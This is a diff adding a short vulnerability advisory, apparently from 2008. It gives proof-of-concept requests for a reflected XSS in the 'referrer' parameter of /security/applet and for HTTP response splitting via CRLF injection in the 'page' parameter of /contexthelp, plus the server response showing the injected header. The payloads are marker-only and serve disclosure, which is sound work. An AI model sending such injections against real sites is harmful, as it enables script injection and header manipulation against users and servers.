@@ -1,0 +1,28 @@
+
+
+1 XSS:
+
+GET /security/applet?referrer=&gt;&quot;&#039;&gt;&lt;img/src=&quot;javascript:alert(&#039;DSECRG_XSS&#039;)&quot;&gt;
+
+
+2. Response Splitting Vulnerability found in script contexthelp. vulnerable parameter - &quot;page&quot;
+
+
+Example
+*******
+
+GET /contexthelp?page=Foobar?%0d%0aDSECRG_HEADER:testvalue HTTP/1.0
+
+response:
+
+HTTP/1.0 302 Moved temporarily
+Content-Length: 0
+Date: Ð§Ñ~B, 25 Ñ~AÐµÐ½ 2008 10:47:42 GMT
+Server: Acme.Serve/v1.7 of 13nov96
+Connection: close
+Expires: 0
+Cache-Control: no-cache
+Content-type: text/html
+Location: help/english/Foobar?
+DSECRG_HEADER:testvalue
+Content-type: text/html
